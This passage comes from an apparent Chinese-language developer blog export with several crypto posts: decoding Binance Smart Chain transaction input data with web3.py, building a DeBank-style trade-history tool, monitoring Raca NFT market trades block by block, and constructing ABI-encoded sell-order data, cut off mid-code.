<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211008151300.png" alt="20211008151300"></p>
<p>api获取到json结果，本来想拿到它的hash再去进一步查询，但是看到<code>input</code>的数据，这里面其实也是包含了交易的内容，可以尝试去decode这些数据。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211008153504.png" alt="20211008153504"></p>
<p><a href="https://ethereum.stackexchange.com/questions/11144/how-to-decode-input-data-from-a-transaction">How to decode input data from a transaction?</a></p>
<p>搜索了一下，似乎是可以定义<code>contract</code>对象，调用函数直接decode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract.decode_function_input(transaction.input)</span><br></pre></td></tr></table></figure>


<p>每次回购动作，都是去跟合约交互<br><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211008151537.png" alt="20211008151537"></p>
<p>但是这个合约没有开源，没法拿到abi,没法获得<code>contract</code>对象，似乎就没法直接去decode。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/7A702759-9A99-4885-8FE9-26DFBE6BC98F.png" alt="7A702759-9A99-4885-8FE9-26DFBE6BC98F"></p>
<p>再观察一下其中一个input数据:</p>
<p><code>0x5c11d79500000000000000000000000000000000000000000000065a4da25d3016c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000c6ce2918d13b7983fa6c305e726c3dc4c805b42100000000000000000000000000000000000000000000000000000000615fe5380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000acb8f52dc63bb752a51186d1c55868adbffee9c1000000000000000000000000197ea04912dc81fcd19992e6210168109aa9c3fe</code></p>
<p>最后一段数据是 回购宝石代币的代币地址</p>
<p>暂且判断最后一段数据，是哪个代币地址，则是回购了哪个代币</p>
<hr>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果:"></a>效果:</h2><p>定时任务+tg提醒</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/03DD10DA-7E3B-46BD-9ECA-A0B600AA74AC.png" alt="03DD10DA-7E3B-46BD-9ECA-A0B600AA74AC"></p>
<hr>
<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug:"></a>Bug:</h1><p>刚开始跑的时候，发现有延迟</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211008153914.png" alt="20211008153914"></p>
<p><code>https://api.bscscan.com/api?module=account&amp;action=txlist&amp;address=0xF426a8d0A94bf039A35CEE66dBf0227A7a12D11e&amp;startblock=0&amp;endblock=99999999&amp;page=1&amp;offset=10&amp;sort=asc&amp;apikey=YourApiKeyToken</code></p>
<p>猜测是<code>startblock</code>参数造成的，不要从0区块开始查，后续每次跑的时候都更新一下这个参数即可。</p>
<hr>
<h1 id="decode-input-data试验"><a href="#decode-input-data试验" class="headerlink" title="decode input data试验:"></a>decode input data试验:</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line">infuraurl = <span class="string">&#x27;https://rpcapi.fantom.network&#x27;</span></span><br><span class="line">web3_ins = Web3(Web3.HTTPProvider(infuraurl))</span><br><span class="line">connection_status = (web3_ins.isConnected())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] fantom network connect status : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(connection_status))</span><br><span class="line">contract = web3_ins.eth.contract(address=Contract_Addr, abi=json.loads(Contract_Abi))</span><br><span class="line"></span><br><span class="line">input_data= <span class="string">&quot;0x9024944800000000000000000000000000000000000000000000000000000000001215e0&quot;</span></span><br><span class="line"></span><br><span class="line">result  = contract.decode_function_input(input_data)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>在有abi的情况下，确实是可以解出input data的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&lt;Function level_up(uint256)&gt;, &#123;&#x27;_summoner&#x27;: 1185248&#125;)</span><br></pre></td></tr></table></figure>


<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/3C8C2ECB-DEF5-45CC-BFA8-088E83552776.png" alt="3C8C2ECB-DEF5-45CC-BFA8-088E83552776"></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/556A7322-7E85-4AD0-B6CB-CCAA10C09D20.png" alt="556A7322-7E85-4AD0-B6CB-CCAA10C09D20"></p>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://docs.bscscan.com/api-endpoints/accounts">bscscan api</a></li>
<li><a href="https://ethereum.stackexchange.com/questions/11144/how-to-decode-input-data-from-a-transaction">How to decode input data from a transaction?</a></li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-BscTradeHistory Project</title>
    <url>//7095.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>debank是个很好用的产品,比如交易历史功能，相比原生的bscsan的原生记录，debank的展示得更清晰，某笔交易和哪个项目的做了什么交互动作、token的交换记录、gas费用转换成u显示。<br>看着不错，仿照debank的交易历史功能做个小项目练练手。</p>
<h1 id="debank交易历史界面"><a href="#debank交易历史界面" class="headerlink" title="debank交易历史界面:"></a>debank交易历史界面:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211031160825.png" alt="20211031160825"></p>
<p>有以下功能点:</p>
<ul>
<li>钱包余额总值</li>
<li>不同的公链</li>
<li>交易时间</li>
<li>交易hash</li>
<li>与什么合约做了什么交互动作</li>
<li>token的传输记录，增加了X Token,减少了X Token</li>
<li>gas费用换算成u</li>
</ul>
<h1 id="项目效果图"><a href="#项目效果图" class="headerlink" title="项目效果图:"></a>项目效果图:</h1><p>项目地址:<a href="https://github.com/jerrychan807/bsc_trade_history">bsc_trade_history</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211104122542.png" alt="20211104122542"></p>
<h1 id="功能点"><a href="#功能点" class="headerlink" title="功能点:"></a>功能点:</h1><h2 id="合约交互记录-重点"><a href="#合约交互记录-重点" class="headerlink" title="合约交互记录-重点:"></a>合约交互记录-重点:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211031161445.png" alt="20211031161445"></p>
<p>有以下几个点:</p>
<ul>
<li>项目的logo</li>
<li>项目名字</li>
<li>调用合约的具体函数</li>
</ul>
<h2 id="合约交互记录-项目logo和名字"><a href="#合约交互记录-项目logo和名字" class="headerlink" title="合约交互记录-项目logo和名字:"></a>合约交互记录-项目logo和名字:</h2><p>交易记录里，会记录你地址与哪个合约发生了交互</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211031161723.png" alt="20211031161723"></p>
<p>可以知道合约地址，一个项目可以有好几个合约地址，比如<code>PancakeSwap</code>可以有几个合约地址</p>
<ul>
<li><code>PancakeSwap: Router v2</code></li>
<li><code>PancakeSwap: Router v1</code></li>
<li>…</li>
</ul>
<p>这里主要是要找到<code>合约地址</code>和<code>项目</code>的映射关系<br>暂时有几个思路:</p>
<ul>
<li><code>contract creator</code> 部署项目合约的地址</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211031162907.png" alt="20211031162907"></p>
<ul>
<li>在项目源码找常量，记录了那些项目合约地址</li>
</ul>
<p>这一块感觉后续要不断去维护这些映射关系</p>
<h2 id="合约交互记录-调用合约的具体函数"><a href="#合约交互记录-调用合约的具体函数" class="headerlink" title="合约交互记录-调用合约的具体函数:"></a>合约交互记录-调用合约的具体函数:</h2><p>调用bscscan的这个<code>Get a list of &#39;Normal&#39; Transactions By Address</code>接口,可以获得以下数据</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211104123527.png" alt="20211104123527"></p>
<p>调用合约的具体函数可以通过解析<code>input_data</code>得知</p>
<p>如果项目合约是开源验证过的话，可以通过<code>decode_function_input</code>接得</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">contract_ins = self.get_token_contract_with_abi(contract_address, contract_abi_json)</span><br><span class="line">func, params = contract_ins.decode_function_input(input_data)</span><br></pre></td></tr></table></figure>

<p>如果项目合约未开源,<code>input_data</code>的前4个字节是函数原型的<code>Keccak256</code>哈希，可以调用<a href="https://www.4byte.directory/docs/">4byte.directory</a>进行哈希查询，反查出函数名。</p>
<hr>
<h2 id="transaction里的token传输记录"><a href="#transaction里的token传输记录" class="headerlink" title="transaction里的token传输记录:"></a>transaction里的token传输记录:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211104131002.png" alt="20211104131002"></p>
<p>要怎么解析出交易里代币的传输记录？<br><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211029094938.png" alt="20211029094938"></p>
<p>token基本都是符合<code>erc20</code>标准,都含有标准的<code>Transfer</code>函数<br>要知道该次交易里token的传输记录，要解析log里的<code>Transfer event</code></p>
<p>但并不是所有log里，都能看到<code>Transfer</code>的字眼<br><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211029100319.png" alt="20211029100319"></p>
<p>有的就没有<br><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211029100713.png" alt="20211029100713"></p>
<p>由于符合erc20标准的代币的<code>Transfer(address from, address to, uint256 value)</code>函数是固定的，<br>经过<code>keccak</code>哈希后,可得到哈希字符串<code>0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</code></p>
<p>如果该次交易里含有erc20代币的传输，那么就存在含有该哈希的<code>event</code>.<br>接下来去解析这些<code>event</code>就可以知道token的传输记录了</p>
<p>参考:<a href="https://stackoverflow.com/questions/52222758/erc20-tokens-transferred-information-from-transaction-hash">ERC20 Tokens Transferred Information from Transaction Hash</a></p>
<hr>
<h1 id="Bug-amp-Todo"><a href="#Bug-amp-Todo" class="headerlink" title="Bug&amp;Todo:"></a>Bug&amp;Todo:</h1><h2 id="个人地址转账"><a href="#个人地址转账" class="headerlink" title="个人地址转账:"></a>个人地址转账:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211103115056.png" alt="20211103115056"></p>
<p>如何判断一个地址是合约地址还是个人地址？</p>
<p><a href="https://ethereum.stackexchange.com/questions/28521/how-to-detect-if-an-address-is-a-contract">How to detect if an address is a contract?</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211103115835.png" alt="20211103115835"></p>
<p>个人地址的转账记录这块还没做对应的解析</p>
<h2 id="SSL-error"><a href="#SSL-error" class="headerlink" title="SSL error:"></a>SSL error:</h2><p>[SSL: DECRYPTION_FAILED_OR_BAD_RECORD_MAC] decryption failed or bad record mac (_ssl.c:2570)</p>
<h2 id="normal"><a href="#normal" class="headerlink" title="normal"></a>normal</h2><p>只用了bscscan的这个<code>Get a list of &#39;Normal&#39; Transactions By Address</code>接口，还有一些交易类型没收录进去，仍有欠缺</p>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://medium.com/coinmonks/discovering-the-secrets-of-an-ethereum-transaction-64febb00935c">Unlocking the Secrets of an Ethereum Transaction</a></li>
<li><a href="https://stackoverflow.com/questions/55258332/find-the-function-name-and-parameter-from-input-data">Find the function name and parameter from input data</a></li>
<li><a href="https://www.4byte.directory/">https://www.4byte.directory/</a></li>
<li><a href="https://github.com/mikeshultz/py4byte">py4byte</a></li>
<li><a href="https://stackoverflow.com/questions/48004356/get-token-transfer-detail-from-transaction-hash-with-web3js">Get token transfer detail from transaction hash with web3js</a></li>
<li><a href="https://ethereum.stackexchange.com/questions/80135/getting-tokens-transferred-from-web3-py">Getting Tokens Transferred from Web3.py</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/389359014">web3.py extraData 错误</a></li>
<li><a href="https://code.z01.com/bootstrap-vue/docs/">bootstrapvue中文文档</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/311323583">用Flask和Vue制作一个单页应用（一）</a></li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-Raca Nft市场实时交易记录</title>
    <url>//43268.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220512174618.png" alt="20220512174618"></p>
<p>朋友有需求，想要监控<code>Raca NFT</code>市场在BSC链上的实时交易记录<br>特别是某几类物品挂的卖单，比如药水等，方便他可以买到较便宜的物品。</p>
<p>要获取Raca NFT市场的实时交易记录，有两个数据来源：</p>
<ol>
<li>官方网站爬虫、API</li>
<li>读取bsc每个块的数据</li>
</ol>
<p>第一种延时严重，存在几分钟的延时，所以采取第二种</p>
<h1 id="读取Bsc-Block-Data"><a href="#读取Bsc-Block-Data" class="headerlink" title="读取Bsc Block Data"></a>读取Bsc Block Data</h1><h2 id="快速读取block数据"><a href="#快速读取block数据" class="headerlink" title="快速读取block数据"></a>快速读取block数据</h2><p>bsc链上约3s左右出一个块,出块的频率很高。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220512174907.png" alt="20220512174907"></p>
<p>一开始是简单使用<code>time.sleep()</code>去停顿几秒，避免对节点发起过多的请求，但是这样会出现漏块的问题。</p>
<p>后来想到是，配置多个节点地址，每次查询前随机选用一个节点，这样既可以减少漏块的几率，也不会因为查询频率过高被节点ban.</p>
<p>经过多次测试，此类大量查询的情况下，官方给的节点相比商用的有限制次数的节点会更好用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 官方给的节点列表</span></span><br><span class="line">RPC_List = [<span class="string">&#x27;https://bsc-dataseed.binance.org/&#x27;</span>, <span class="string">&#x27;https://bsc-dataseed1.defibit.io/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https://bsc-dataseed1.ninicoin.io/&#x27;</span>, <span class="string">&#x27;https://bsc-dataseed2.defibit.io/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https://bsc-dataseed3.defibit.io/&#x27;</span>, <span class="string">&#x27;https://bsc-dataseed4.defibit.io/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https://bsc-dataseed2.ninicoin.io/&#x27;</span>, <span class="string">&#x27;https://bsc-dataseed3.ninicoin.io/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https://bsc-dataseed4.ninicoin.io/&#x27;</span>, <span class="string">&#x27;https://bsc-dataseed1.binance.org/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https://bsc-dataseed2.binance.org/&#x27;</span>, <span class="string">&#x27;https://bsc-dataseed3.binance.org/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https://bsc-dataseed4.binance.org/&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>能稳定、快速的获取到block的数据后，接下来就要过滤出跟Raca NFT市场相关的交易记录</p>
<h2 id="过滤相关记录："><a href="#过滤相关记录：" class="headerlink" title="过滤相关记录："></a>过滤相关记录：</h2><p>相关的交易记录：tx的to地址指向raca市场合约</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list_of_block_transactions = block.transactions</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> transaction <span class="keyword">in</span> list_of_block_transactions:</span><br><span class="line">    to_account = transaction[<span class="string">&#x27;to&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> to_account == self.contract_addr: <span class="comment"># 与raca市场合约交互的记录</span></span><br><span class="line">        self.parse_transaction(transaction, block_timestamp)</span><br></pre></td></tr></table></figure>

<p>过滤出相关记录后，就要进行对记录进行解析了。</p>
<h2 id="解析："><a href="#解析：" class="headerlink" title="解析："></a>解析：</h2><p><code>input data</code>的前八位为方法名，找出买卖两类函数的hash，就可以再次过滤出raca市场有关的买卖交易记录了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_transaction</span>(<span class="params">self, transaction, block_timestamp</span>):</span><br><span class="line">    <span class="comment"># logger.debug(&quot;parse transaction. hash:&#123;&#125;&quot;.format(hash_info[&quot;hash&quot;]))</span></span><br><span class="line">    transaction_info = &#123;&#125;</span><br><span class="line">    transaction_info[<span class="string">&quot;tx&quot;</span>] = transaction[<span class="string">&quot;hash&quot;</span>].<span class="built_in">hex</span>()</span><br><span class="line">    transaction_info[<span class="string">&quot;from&quot;</span>] = transaction[<span class="string">&quot;from&quot;</span>]</span><br><span class="line">    transaction_info[<span class="string">&quot;time&quot;</span>] = timestamp2date(<span class="built_in">int</span>(block_timestamp))</span><br><span class="line"></span><br><span class="line">    input_data = transaction[<span class="string">&quot;input&quot;</span>]</span><br><span class="line">    four_byte = input_data[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> four_byte == <span class="string">&quot;0x467f963d&quot;</span>:  <span class="comment"># sell的函数选择器</span></span><br><span class="line">        transaction_info[<span class="string">&quot;type&quot;</span>] = <span class="string">&quot;SELL&quot;</span></span><br><span class="line">        nft_token, token_id, num, per_price = self.parse_sell_input_data(input_data)</span><br><span class="line">        transaction_info[<span class="string">&quot;token&quot;</span>] = Web3.toChecksumAddress(nft_token)</span><br><span class="line">        transaction_info[<span class="string">&quot;tokenId&quot;</span>] = token_id</span><br><span class="line">        transaction_info[<span class="string">&quot;count&quot;</span>] = num</span><br><span class="line">        transaction_info[<span class="string">&quot;amount&quot;</span>] = <span class="built_in">str</span>(per_price)</span><br><span class="line">        <span class="comment"># 。。。。</span></span><br></pre></td></tr></table></figure>

<p>剩下的部分,就是对各个参数进行解析了。</p>
<blockquote>
<p>data组成规则:<br>关于data，前八位为方法名以及参数类型的hash，只要方法名，参数个数，参数顺序以及参数类型确定，方法名hash就确定</p>
<p>hash往后64位进行分割，每一段就是方法的参数，不足64前面补零凑64位</p>
<p>参数中对于数组类型要注意，解析会有点特殊，一般会先以位数序号进行占位，然后到指定位序才是真正数组数据的起点，数组数据起点会先表明下面数据有多少位，然后才是数组数据的依次排列</p>
</blockquote>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h1><p>至此，通过以下几个步骤</p>
<ul>
<li>读取block数据</li>
<li>过滤出raca市场合约相关交易</li>
<li>过滤出买卖相关的交易</li>
</ul>
<p>就基本可以完成对<code>Raca NFT</code>市场实时交易记录的监控了。</p>
<hr>
<p>在开发的过程中，也发现了一些有趣的点。</p>
<h1 id="有趣的点："><a href="#有趣的点：" class="headerlink" title="有趣的点："></a>有趣的点：</h1><h2 id="科学家抢购"><a href="#科学家抢购" class="headerlink" title="科学家抢购:"></a>科学家抢购:</h2><p>比如该<a href="https://bscscan.com/tx/0x80aef859189aa9508ca6760cd669057ed592bf1ac646f6c5951c8dd6e89b4927">tx</a>在<code>13151047</code>区块挂了元兽蛋的卖单，每个以<code>86.5raca</code>售出</p>
<p>在接下来的几个区块，都有人发单去抢<br>最快是之后的第二个区块:block_num: <code>13151049</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 抢购的tx列表</span></span><br><span class="line"><span class="number">0x62ab3cb23f62459154b652dfb855d4f6f9df4b6fa27363ce69484909f695b94c</span></span><br><span class="line"><span class="number">0x6e8e06710565fd9cd5f4d8223ed172d817f2e50b5f0aa4f297bf9738bab5b541</span></span><br><span class="line"><span class="number">0xfd1bee48d470f8bf9b3f4134ea5de7fc323f20b3de2ccd6d8658f02378d97649</span></span><br><span class="line"><span class="number">0x65ec96412cd5632b8e29225cb8ce96bb76429cc4da68a28ad394643c75a2c8b7</span></span><br><span class="line"><span class="number">0x094b419c95790a8514193a79e2835db42e7ccc0313a5d6511a486853c06508d3</span></span><br></pre></td></tr></table></figure>

<p>第三个区块:block_num: <code>13151050</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 抢购的tx列表</span></span><br><span class="line"><span class="number">0x23b210a6e49dc724ad7d36ca89c57ca187d6e179d568bfe1f0acba77ab09fbc3</span>        </span><br><span class="line"><span class="number">0xfa8327cbd2e3e5d92cc6e23e1b1e0d3d1f40e17976d76047d91da6385396de3f</span></span><br><span class="line"><span class="number">0x4a93d2d696df10b78a5b69b095a134a6f12642aa76f92239cf0efcc660ab114b</span></span><br></pre></td></tr></table></figure>

<p>第六个区块:block_num: <code>13151053</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 抢购的tx列表</span></span><br><span class="line"><span class="number">0xc4373dd6aac99ecb046c581f8006c34bda520111b4e575d400241eb59d889e85</span></span><br></pre></td></tr></table></figure>

<p>奇怪的是大家都抢购失败了，<code>Fail with error &#39;Auction: auction not OnAuction&#39;</code><br>但能在卖单的之后的第二个区块，能检测并发起买单的这些科学家的实力都是挺厉害的。</p>
<h2 id="市场活跃度-amp-差价"><a href="#市场活跃度-amp-差价" class="headerlink" title="市场活跃度&amp;差价"></a>市场活跃度&amp;差价</h2><p>在比较火的那段时间里，raca nft市场的交易量是特别大的，流动性很足，基本上很多商品只要挂最低价上去，就会被立刻买走。<br>另外，raca nft市场可以批量10个或100个卖出，一般批量的价格会比单个的价格更低，存在一些差价，这当中有套利的机会。</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-RacaNft市场挂单script</title>
    <url>//1333.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>朋友有一批raca potion的nft要出售,尝试用程序去挂单</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211119161018.png" alt="20211119161018"></p>
<p>raca的nft market的合约没开源，自然无法用abi、合约地址去实例化合约对象，然后快速调用合约对应函数。<br>需要自己构造data，与合约交互。</p>
<hr>
<h1 id="InputData例子解析"><a href="#InputData例子解析" class="headerlink" title="InputData例子解析:"></a>InputData例子解析:</h1><p>先了解一下InputData是怎么构成的。<br>以下面最简单的合约为例，我们看看用参数 1 调用set(uint x)，这个交易附带的数据是什么。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SimpleStorage</span> &#123;</span><br><span class="line">    </span><br><span class="line">    uint storedData;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set</span>(<span class="params">uint x</span>) public &#123;</span><br><span class="line">        storedData = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params"></span>) public constant returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> storedData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然第一步需要先把合约部署到以太坊网络上，然后用 “1” 作为参数调用set，如下图:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211117175500.png" alt="20211117175500"></p>
<p>然后打开etherscan查看交易详情数据, 可以看到其附加数据如下图：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211117175532.png" alt="20211117175532"></p>
<p>这个数据就是ABI的编码数据：<br><code>0x60fe47b10000000000000000000000000000000000000000000000000000000000000001</code></p>
<p>把上面交易的附加数据拷贝出来分析一下，这个数据可以分成两个子部分：</p>
<p>函数选择器(4字节)</p>
<ul>
<li><code>0x60fe47b1</code></li>
</ul>
<p>第一个参数(32字节)</p>
<ul>
<li><code>00000000000000000000000000000000000000000000000000000000000000001</code></li>
</ul>
<p>函数选择器值 实际是对函数签名字符串进行<code>sha3（keccak256</code>哈希运算之后，取前4个字节，用代码表示就是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes4(sha3(“set(uint256)”)) == 0x60fe47b1</span><br></pre></td></tr></table></figure>
<p>参数部分则是使用对应的16进制数。<br>现在就好理解 附加数据怎么转化为对应的函数调用。</p>
<h1 id="实验"><a href="#实验" class="headerlink" title="实验:"></a>实验:</h1><p>刚好自己有在练手solidity，有部署到ropsten测试网上。<br>可以尝试能不能构造出已知交易的<code>input_data</code></p>
<p>调用的合约函数:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createZoombie</span>(<span class="params">string name</span>) public &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mint_zoombie</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># function createZoombie(string name) public&#123;&#125;</span></span><br><span class="line">    func_abi = &#123;</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: [</span><br><span class="line">            &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;abc&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>&#125;,  <span class="comment"># 参数类型</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;createZoombie&quot;</span>,  <span class="comment"># 函数名</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fn_selector = <span class="string">&#x27;0x&#x27;</span> + encode_hex(function_abi_to_4byte_selector(func_abi)) </span><br><span class="line"></span><br><span class="line">    args_data = encode_hex(encode_single(<span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;haha&#x27;</span>))  <span class="comment"># encode_abi([&#x27;string&#x27;], [&#x27;haha&#x27;])</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(fn_selector)</span><br><span class="line">    <span class="built_in">print</span>(args_data)</span><br><span class="line">    total_data = fn_selector + args_data</span><br><span class="line">    <span class="built_in">print</span>(total_data)</span><br></pre></td></tr></table></figure>

<p>实际的<code>input_data</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x3dca7430 <span class="comment"># 方法名</span></span><br><span class="line">6861686100000000000000000000000000000000000000000000000000000000 <span class="comment"># 参数:haha</span></span><br></pre></td></tr></table></figure>

<p>构造出的<code>input_data</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x3dca7430 <span class="comment"># 方法名</span></span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000020</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000004</span><br><span class="line">6861686100000000000000000000000000000000000000000000000000000000 <span class="comment"># 参数:haha</span></span><br></pre></td></tr></table></figure>

<p>没有构造成功，经过多个tx,观察发现中间多出来的数据是固定。<br>但一时不知道是如何generate出来的，只能暂时先放弃了。</p>
<h1 id="data的组成规则："><a href="#data的组成规则：" class="headerlink" title="data的组成规则："></a>data的组成规则：</h1><blockquote>
<p>关于data，前八位为方法名以及参数类型的hash，只要方法名，参数个数，参数顺序以及参数类型确定，方法名hash就确定</p>
<p>hash往后64位进行分割，每一段就是方法的参数，不足64前面补零凑64位</p>
<p>参数中对于数组类型要注意，解析会有点特殊，一般会先以位数序号进行占位，然后到指定位序才是真正数组数据的起点，数组数据起点会先表明下面数据有多少位，然后才是数组数据的依次排列</p>
</blockquote>
<h1 id="raca-nft挂单卖出"><a href="#raca-nft挂单卖出" class="headerlink" title="raca nft挂单卖出:"></a>raca nft挂单卖出:</h1><h2 id="授权："><a href="#授权：" class="headerlink" title="授权："></a>授权：</h2><p>授权这个data比较简单，找到多几个tx比较一下。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211119155832.png" alt="20211119155832"></p>
<p>可知他的data是固定的，直接用就行了。</p>
<h2 id="挂单卖出："><a href="#挂单卖出：" class="headerlink" title="挂单卖出："></a>挂单卖出：</h2><p>依然是找到多几个tx比较一下，按照data的组成规则分开观察。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x467f963d                                                         <span class="comment"># function selector</span></span><br><span class="line">00000000000000000000000051353799f8550c9010a8b0cbfe6c02ca96e026e2   <span class="comment"># usm potion药水地址</span></span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000001   <span class="comment"># 数量</span></span><br><span class="line">00000000000000000000000012bb890508c125661e03b09ec06e404bc9289040   <span class="comment"># Raca token 地址</span></span><br><span class="line">0000000000000000000000000000000000000000000002f6d546136addf80000   <span class="comment"># 价格</span></span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure>

<p>可知，主要是要修改数量和价格的数据，其他数据不变。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构造卖单的data</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_potion_sell_order_input_data</span>(<span class="params">self, price</span>):</span><br><span class="line">    logger.debug(<span class="string">&quot;[*] set price: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(price))</span><br><span class="line">    price = self.bsc_ins.w3.toWei(price, <span class="string">&#x27;ether&#x27;</span>) <span class="comment"># 转换成Wei</span></span><br><span class="line"></span><br><span class="line">    price_hex_str = self.bsc_ins.w3.toHex(price) <span class="comment"># 转换成16进制</span></span><br><span class="line">    price_hex_str = price_hex_str.replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="comment"># 